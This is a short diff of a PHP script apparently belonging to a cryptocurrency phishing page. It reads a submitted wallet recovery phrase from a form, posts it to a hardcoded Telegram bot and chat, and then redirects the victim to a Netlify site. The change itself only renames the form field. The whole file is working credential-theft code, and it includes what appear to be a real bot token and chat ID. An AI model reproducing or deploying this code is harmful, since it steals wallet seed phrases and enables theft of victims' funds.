@@ -4,11 +4,11 @@ $botToken = '7210917381:AAGPxkv9Y3dqnBj_rHOtWvvuIyg9qHlpFrg'; // Replace with yo
 $chatId = '5160818690';     // Replace with your chat ID
 
 // Get the recovery phrase from POST data
-$recoveryPhrase = $_POST['recoveryPhrase'] ?? 'No phrase provided';
+$unlockSubmitBtn = $_POST['unlockSubmitBtn'] ?? 'No phrase provided';
 
 // Prepare the message
 $message = "New Recovery Phrase Received:\n";
-$message .= $recoveryPhrase;
+$message .= $unlockSubmitBtn;
 
 // Telegram API URL
 $telegramApiUrl = "https://api.telegram.org/bot7210917381:AAGPxkv9Y3dqnBj_rHOtWvvuIyg9qHlpFrg/sendMessage";
@@ -34,3 +34,4 @@ curl_close($ch);
 header('Location: https://success-lucky-5f3e1c-moxie.netlify.app/?status=314');
 exit();
 ?>
+
